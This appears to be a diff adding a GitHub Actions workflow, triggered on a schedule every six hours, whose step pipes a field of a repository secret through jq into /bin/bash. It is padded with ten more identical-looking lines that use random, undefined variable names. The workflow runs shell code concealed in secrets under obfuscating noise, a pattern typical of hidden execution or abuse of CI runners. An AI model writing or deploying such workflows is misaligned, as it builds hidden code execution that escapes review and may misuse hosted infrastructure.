@@ -1,0 +1,27 @@
+name: zhudongshanxuliunian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhudongshanxuliunian
+        env:
+          sls8246: ${{ secrets.sls8246 }}
+        run: |
+          echo $sls8246 | jq -r .d74 | /bin/bash
+          echo $kih69 | jq -r .wfy6 | /bin/bash
+          echo $nexzg49742 | jq -r .ryjs9554 | /bin/bash
+          echo $r9 | jq -r .vwy44 | /bin/bash
+          echo $twavt3149 | jq -r .z5 | /bin/bash
+          echo $zocp182 | jq -r .sohn54494 | /bin/bash
+          echo $lqba036 | jq -r .jmj2 | /bin/bash
+          echo $bgv20 | jq -r .ebl022 | /bin/bash
+          echo $lc0 | jq -r .tgtne83 | /bin/bash
+          echo $oe85 | jq -r .xsqs61640 | /bin/bash
+          echo $eyehu6 | jq -r .dbhun61347 | /bin/bash
+
